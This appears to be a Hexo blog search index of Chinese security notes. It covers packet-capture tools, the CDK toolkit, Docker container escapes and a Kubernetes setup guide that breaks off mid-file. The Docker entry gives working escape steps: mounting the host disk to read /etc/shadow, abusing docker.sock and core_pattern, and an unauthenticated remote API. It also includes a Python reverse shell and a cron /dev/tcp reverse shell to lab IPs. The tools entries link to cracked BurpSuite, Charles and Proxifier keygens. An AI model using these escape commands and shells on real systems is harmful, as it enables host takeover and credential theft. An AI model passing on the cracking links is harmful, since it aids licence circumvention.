<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>抓包工具</title>
      <link href="/2025/06/17/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/"/>
      <url>/2025/06/17/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h1><p>BurpSuite 破解版</p><p><a href="https://pan.baidu.com/s/1yUcTEeJVETKjsw3RQq76vw?pwd=smar">https://pan.baidu.com/s/1yUcTEeJVETKjsw3RQq76vw?pwd=smar</a></p><p>提取码: smar</p><p>安装 JAVA 的环境，剩下步骤百度搜索即可完成</p><p>Wireshark</p><p><a href="https://www.wireshark.org/">https://www.wireshark.org</a></p><p>Charles</p><p><a href="https://www.charlesproxy.com/download">https://www.charlesproxy.com/download</a></p><p>Fidder</p><p><a href="https://www.telerik.com/fiddler">https://www.telerik.com/fiddler</a></p><p>Proxifier</p><p><a href="https://proxifiter.com/">https://proxifiter.com</a></p><p>破解：<a href="https://github.com/y9nhjy/Proxifier-Keygen">https://github.com/y9nhjy/Proxifier-Keygen</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-145527-1024x364.png"></p><p>one-fox集成工具箱等</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓包</title>
      <link href="/2025/06/17/%E6%8A%93%E5%8C%85/"/>
      <url>/2025/06/17/%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-抓包技术"><a href="#基础知识-抓包技术" class="headerlink" title="基础知识-抓包技术"></a>基础知识-抓包技术</h1><p>常用工具：burpsuite，charles （两工具可配合使用）</p><p>Charles 破解网站</p><p><a href="https://www.zzzmode.com/mytools/charles">https://www.zzzmode.com/mytools/charles</a></p><p>自行百度，没啥可讲</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云攻防-自动化工具CDK</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7CDK/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7CDK/</url>
      
        <content type="html"><![CDATA[<h1 id="云攻防-自动化工具CDK"><a href="#云攻防-自动化工具CDK" class="headerlink" title="云攻防-自动化工具CDK"></a>云攻防-自动化工具CDK</h1><p><a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></p><p>概述</p><p>CDK 是一个开源的容器渗透工具包，旨在提供对各种精简容器的稳定利用，且无需依赖任何操作系统。它配备了实用的网络工具和许多强大的 PoC&#x2F;EXP，可帮助您轻松脱离容器并接管 K8s 集群。</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云原生-docker</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E4%BA%91%E5%8E%9F%E7%94%9F-docker/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E4%BA%91%E5%8E%9F%E7%94%9F-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="云原生-docker"><a href="#云原生-docker" class="headerlink" title="云原生-docker"></a>云原生-docker</h1><p>拿到权限：判断是否为容器</p><p><a href="https://blog.csdn.net/qq_23936389/article/details/131486643">https://blog.csdn.net/qq_23936389/article/details/131486643</a></p><p>三种安全容器逃逸：</p><ul><li>特权模式启动导致（不安全启动 适用于 java jsp 高权限无需提权 还要提权才能逃<br>逸）</li><li>危险挂载启动导致（危险启动 适用于 java jsp 高权限无需提权 还要提权才能逃逸）<br>-docker 自身 &amp; 系统漏洞（软件漏洞和系统漏洞 都可用）<br><a href="https://wiki.teamssix.com/cloudnative/">https://wiki.teamssix.com/cloudnative/</a></li></ul><h2 id="容器逃逸-特权模式"><a href="#容器逃逸-特权模式" class="headerlink" title="容器逃逸 - 特权模式"></a>容器逃逸 - 特权模式</h2><p><a href="https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html">https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html</a></p><p>启动 docker 容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm --privileged=true -it alpine  //启用--privileged=true，container内的root拥有真正的root权限，可能让攻击者利用此进行容器逃逸</span><br></pre></td></tr></table></figure><p>判断是否为容器环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;</span><br></pre></td></tr></table></figure><p>如果返回 Is Docker，说明当前是 Docker 容器环境，反之亦然。</p><p>判断特权模式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep -qi &quot;0000003fffffffff&quot; &amp;&amp; echo &quot;Is privileged mode&quot; || echo &quot;Not privileged mode&quot;</span><br><span class="line">或者</span><br><span class="line">cat /proc/self/status | grep CapEff </span><br></pre></td></tr></table></figure><p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为 0000003fffffffff 或者是 0000001fffffffff</p><p>方法一：</p><p>查看挂载磁盘设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test &amp;&amp; mount /dev/sda1 /test</span><br></pre></td></tr></table></figure><p>尝试访问宿主机 shadow 文件，可以看到正常访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /test/etc/shadow</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line">chroot /mnt adduser john</span><br></pre></td></tr></table></figure><p>通过新添加的用户登录</p><h2 id="容器逃逸-挂载-逃逸"><a href="#容器逃逸-挂载-逃逸" class="headerlink" title="容器逃逸 - 挂载 逃逸"></a>容器逃逸 - 挂载 逃逸</h2><p><a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html</a></p><p>启动容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu //procfs</span><br><span class="line">docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu //Socket</span><br></pre></td></tr></table></figure><h2 id="挂载-Docker-Socket-逃逸-："><a href="#挂载-Docker-Socket-逃逸-：" class="headerlink" title="挂载 Docker Socket 逃逸 ："></a>挂载 Docker Socket 逃逸 ：</h2><p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Docker Socket is mounted.&quot; || echo &quot;Docker Socket is not mounted.&quot;</span><br><span class="line">ls -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/host ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /host</span><br></pre></td></tr></table></figure><h2 id="挂载-procfs-逃逸-："><a href="#挂载-procfs-逃逸-：" class="headerlink" title="挂载 procfs 逃逸 ："></a>挂载 procfs 逃逸 ：</h2><p>执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot;</span><br></pre></td></tr></table></figure><p>如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure><p>找到当前容器在宿主机下的绝对路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/mounts | xargs -d &#x27;,&#x27; -n 1 | grep workdir</span><br><span class="line">//为绝对路/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged</span><br></pre></td></tr></table></figure><p>安装 vim 和 gcc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install vim gcc -y</span><br><span class="line">vim /tmp/.t.py</span><br></pre></td></tr></table></figure><p>创建一个反弹 Shell 的 py 脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/python3</span></span><br><span class="line">import  os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = &quot;172.16.214.1&quot;</span><br><span class="line">lport = 4444</span><br><span class="line">def main():</span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), 0)</span><br><span class="line">   os.dup2(s.fileno(), 1)</span><br><span class="line">   os.dup2(s.fileno(), 2)</span><br><span class="line">   os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class="line">   pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">os.remove(<span class="string">&#x27;/tmp/.t.py&#x27;</span>)</span></span><br><span class="line">   s.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>给 Shell 赋予执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 .t.py</span><br></pre></td></tr></table></figure><p>写入反弹 shell 到目标的 proc 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim t.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdio.h&gt;</span></span><br><span class="line">int main(void)  &#123;</span><br><span class="line">   int *a  = NULL;</span><br><span class="line">   *a = 1;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line">gcc t.c -o t</span><br><span class="line">./t</span><br></pre></td></tr></table></figure><h2 id="Docker-远程-API-未授权访问逃逸"><a href="#Docker-远程-API-未授权访问逃逸" class="headerlink" title="Docker 远程 API 未授权访问逃逸"></a>Docker 远程 API 未授权访问逃逸</h2><p>docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker</p><p>将 docker 守护进程监听在 0.0.0.0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure><p>检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP=`hostname -i | awk -F. &#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27; ` &amp;&amp; wget http://$IP:2375</span><br></pre></td></tr></table></figure><p>如果返回 404 说明存在</p><p>列出容器信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br></pre></td></tr></table></figure><p>查看容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br></pre></td></tr></table></figure><p>新运行一个容器，挂载点设置为服务器的根目录挂载至 &#x2F;mnt 目录下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><p>在容器内执行命令，将反弹 shell 的脚本写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1&#x27; &gt;&gt; /mnt/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p>本地监听端口，获取对方宿主机 shell。</p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云攻防-K8S搭建</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-k8s%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-k8s%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="云攻防-k8s手动搭建"><a href="#云攻防-k8s手动搭建" class="headerlink" title="云攻防-k8s手动搭建"></a>云攻防-k8s手动搭建</h1><p>参考视频：<br><a href="https://www.bilibili.com/video/BV1P17fzBES1?spm_id_from=333.788.videopod.episodes&vd_source=89bf25153801ebc942aaf90aa2af1675&p=5">https://www.bilibili.com/video/BV1P17fzBES1?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=5</a><br>看官网搭建：<br><a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/">https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/</a></p><p>国内网络环境 优化的 CentOS 7 部署 Kubernetes 集群详细步骤,及常见问题</p><h2 id="一、环境准备（所有节点执行）"><a href="#一、环境准备（所有节点执行）" class="headerlink" title="一、环境准备（所有节点执行）"></a>一、环境准备（所有节点执行）</h2><h3 id="1-配置主机名与-hosts-解析"><a href="#1-配置主机名与-hosts-解析" class="headerlink" title="1. 配置主机名与 hosts 解析"></a>1. 配置主机名与 hosts 解析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Master 节点</span></span><br><span class="line">hostnamectl set-hostname k8s-master</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Worker 节点（如 node1）</span></span><br><span class="line">hostnamectl set-hostname k8s-node1</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所有节点编辑 /etc/hosts</span></span><br><span class="line">cat &lt;&lt;EOF &gt;&gt; /etc/hosts</span><br><span class="line">&lt;Master节点内网IP&gt; k8s-master</span><br><span class="line">&lt;Worker节点内网IP&gt; k8s-node1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="2-关闭防火墙、SELinux-和-Swap"><a href="#2-关闭防火墙、SELinux-和-Swap" class="headerlink" title="2. 关闭防火墙、SELinux 和 Swap"></a>2. 关闭防火墙、SELinux 和 Swap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line">setenforce 0</span><br><span class="line">sed -i &#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27; /etc/selinux/config</span><br><span class="line">swapoff -a</span><br><span class="line">sed -i &#x27;/ swap / s/^\(.*\)$/#\1/g&#x27; /etc/fstab  # 永久关闭 Swap</span><br></pre></td></tr></table></figure><h3 id="3-配置内核参数"><a href="#3-配置内核参数" class="headerlink" title="3. 配置内核参数"></a>3. 配置内核参数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/sysctl.d/k8s.conf</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">EOF</span><br><span class="line">sysctl --system</span><br></pre></td></tr></table></figure><h3 id="4-加载内核模块"><a href="#4-加载内核模块" class="headerlink" title="4. 加载内核模块"></a>4. 加载内核模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line">modprobe overlay</span><br></pre></td></tr></table></figure><h2 id="二、安装容器运行时（所有节点执行）"><a href="#二、安装容器运行时（所有节点执行）" class="headerlink" title="二、安装容器运行时（所有节点执行）"></a>二、安装容器运行时（所有节点执行）</h2><p>CentOS 7 yum 无法使用</p><p>CentOS 7 仓库已经被归档，当前的镜像地址无法找到所需的文件。CentOS 7 的官方支持已经结束，部分仓库已被移至归档库。这导致了 yum 命令无法找到所需的元数据文件。CentOS 7 的官方仓库在 2024 年 6 月 30 日之后已经停止维护。因此，使用最新的 CentOS 7 官方仓库可能会遇到问题。</p><p>参考文章：</p><p><a href="https://blog.csdn.net/weixin_68792404/article/details/147272888">https://blog.csdn.net/weixin_68792404/article/details/147272888</a></p><p>解决方法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/yum.repos.d</span><br><span class="line">cp  CentOS-Base.repo   CentOS-Base.repo.backup</span><br><span class="line">vi CentOS-Base.repo</span><br><span class="line">修改内容</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CentOS-Base.repo</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The mirror system uses the connecting IP address of the client and the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">update status of each mirror to pick mirrors that are updated to and</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">geographically close to the client.  You should use this <span class="keyword">for</span> CentOS updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">unless you are manually picking other mirrors.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># If the mirrorlist= does not work for you, as a fall back you can try the</span></span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">remarked out baseurl= line instead.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"> </span><br><span class="line">[base]</span><br><span class="line">name=CentOS-$releasever - Base</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=os&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/os/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">released updates</span> </span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-$releasever - Updates</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=updates&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/updates/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">additional packages that may be useful</span></span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-$releasever - Extras</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=extras&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$baseurl</span>=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/extras/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/extras/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">additional packages that extend functionality of existing packages</span></span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-$releasever - Plus</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=centosplus&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/centosplus/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/centosplus/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure><p>保存后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure><p>然后执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"> </span><br><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure><h3 id="1-安装-Docker（国内镜像加速）"><a href="#1-安装-Docker（国内镜像加速）" class="headerlink" title="1. 安装 Docker（国内镜像加速）"></a>1. 安装 Docker（国内镜像加速）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用阿里云 Docker 仓库</span></span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装指定版本 Docker</span></span><br><span class="line">yum install -y docker-ce-20.10.23 docker-ce-cli-20.10.23 containerd.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置 Docker 镜像加速和 cgroup 驱动</span></span><br><span class="line">mkdir -p /etc/docker</span><br><span class="line">cat &lt;&lt;EOF &gt; /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://&lt;你的阿里云镜像加速地址&gt;.mirror.aliyuncs.com&quot;],</span><br><span class="line">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span><br><span class="line">  &quot;log-driver&quot;: &quot;json-file&quot;,</span><br><span class="line">  &quot;log-opts&quot;: 